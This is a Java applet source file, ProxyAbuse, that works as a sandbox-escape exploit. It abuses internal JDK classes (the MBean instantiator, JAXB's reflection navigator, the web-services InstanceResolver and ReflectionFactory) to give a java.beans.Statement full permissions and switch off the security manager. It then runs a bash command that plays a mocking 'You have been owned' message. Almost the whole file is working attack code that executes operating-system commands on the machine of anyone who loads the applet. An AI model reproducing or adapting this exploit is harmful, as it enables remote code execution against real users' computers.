import com.sun.jmx.mbeanserver.*;
import javax.management.*;
import java.lang.reflect.*;
import java.util.*;
import java.beans.*;
import java.security.*;
import java.applet.*;

public class ProxyAbuse extends Applet {

  private Object reflectionNavigator;
  private Method getDeclaredMethods;
  private MBeanInstantiator instantiator;

  public static Object readField(Class clazz, String name) throws Exception {

    Class proxyClass = Proxy.getProxyClass(null, new Class[]{clazz});

    return proxyClass.getFields()[0].get(null);

  }

  public static Method readMethod(Class clazz, String name, Class[] args, Object[] dummyArgs) throws Exception {
    final Method[] result = new Method[1];

    InvocationHandler handler = new InvocationHandler() {
      public Object invoke(Object target, Method m, Object[] args) {
        result[0] = m;
        return null;
      }
    };

    Object proxy = Proxy.newProxyInstance(null, new Class[]{clazz}, handler);

    Class[] newArgs = new Class[args.length];
    Arrays.fill(newArgs, Object.class);

    proxy.getClass().getMethod(name, newArgs).invoke(proxy, dummyArgs);

    return result[0];
  }

  public void disableSecurity() throws Exception {
    Class getReflectionFactoryActionClass = forName("sun.reflect.ReflectionFactory$GetReflectionFactoryAction");


    Class reflectionFactoryClass = forName("sun.reflect.ReflectionFactory");

    Class classFactoryClass = forName("com.sun.xml.internal.bind.v2.ClassFactory");

    Method newInstance = findMethod(classFactoryClass, "create", new Class[]{Class.class});

    Object getReflectionFactoryAction = newInstance.invoke(null, getReflectionFactoryActionClass);

    Method doPrivileged = AccessController.class.getMethod("doPrivileged", PrivilegedAction.class);
  
    Method createSingleton = findMethod(forName("com.sun.xml.internal.ws.api.server.InstanceResolver"), "createSingleton", new Class[]{Object.class});

    Object resolver = createSingleton.invoke(null, new Object());

    Method createInvoker = findMethod(forName("com.sun.xml.internal.ws.api.server.InstanceResolver"), "createInvoker", new Class[]{});

    Object invoker = createInvoker.invoke(resolver);


    Method invoke = findMethod(forName("com.sun.xml.internal.ws.api.server.Invoker"), "invoke", new Class[]{forName("com.sun.xml.internal.ws.api.message.Packet"), java.lang.reflect.Method.class, java.lang.Object[].class});

    
    Object reflectionFactory = invoke.invoke(invoker, null, doPrivileged, new Object[]{getReflectionFactoryAction});

    Method newField = findMethod(reflectionFactory.getClass(), "newField", new Class[]{Class.class, String.class, Class.class, Integer.TYPE, Integer.TYPE, String.class, byte[].class});


    Method newFieldAccessor = findMethod(reflectionFactory.getClass(), "newFieldAccessor", new Class[]{Field.class, Boolean.TYPE});

    Method set = findMethod(forName("sun.reflect.FieldAccessor"), "set", new Class[]{Object.class, Object.class});
    
   
    Object field = newField.invoke(reflectionFactory, new Object[]{Statement.class, "acc", AccessControlContext.class, 18, 2, null, null});
    
    Object fieldAccessor = newFieldAccessor.invoke(reflectionFactory, new Object[]{field, Boolean.TRUE});
    
    
    Statement statement = new Statement(java.lang.System.class, "setSecurityManager", new Object[]{null});
    
    set.invoke(fieldAccessor, new Object[]{statement, createContext()});
    
    
    statement.execute();

  }    

  private void setupForName() throws Exception {
      JmxMBeanServerBuilder localJmxMBeanServerBuilder = new JmxMBeanServerBuilder();

      JmxMBeanServer localJmxMBeanServer = (JmxMBeanServer)localJmxMBeanServerBuilder.newMBeanServer("", null, null);

      this.instantiator = localJmxMBeanServer.getMBeanInstantiator();


  }

  private Class forName(String name) throws Exception {
    return this.instantiator.findClass(name, (ClassLoader)null);
  }


  private void setupFindMethod() throws Exception {
    Class navigatorClass = forName("com.sun.xml.internal.bind.v2.model.nav.Navigator");

    this.reflectionNavigator = readField(navigatorClass, "REFLECTION");

    this.getDeclaredMethods = readMethod(navigatorClass, "getDeclaredMethods", new Class[]{Class.class}, new Object[]{null});
  }

  private Method findMethod(Class clazz, String method, Class[] args) throws Exception {
    List<Method> methods = (List<Method>)getDeclaredMethods.invoke(this.reflectionNavigator, clazz);
    for (Method m : methods) {
      if (m.getName().equals(method) && Arrays.equals(args, m.getParameterTypes())) {
        return m;
      }
    }
    return null;
  }

  public void init() {
    try {
      setupForName();
      setupFindMethod();
      disableSecurity();
      System.out.println(System.getProperty("user.home"));
      ProcessBuilder builder = new ProcessBuilder("/bin/bash", "-c", "osascript -e 'set volume 10' && say -v 'Hysterical' 'Ha Ha Ha Ha Ha' && say -v 'Zarvox' 'You have been owned. Java Applets are vulnerable to remote code execution'");
      builder.start();
    } catch (Exception e) {
      throw new RuntimeException(e);
    }
  }

  public static AccessControlContext createContext() {
    Permissions permission = new Permissions();
    permission.add(new AllPermission());
    
    ProtectionDomain domain = new ProtectionDomain(null, permission);
    
    AccessControlContext context = new AccessControlContext(new ProtectionDomain[]{domain});
    return context;
  }

  public static void main(String[] args) {
    new ProxyAbuse().init();
  }

}
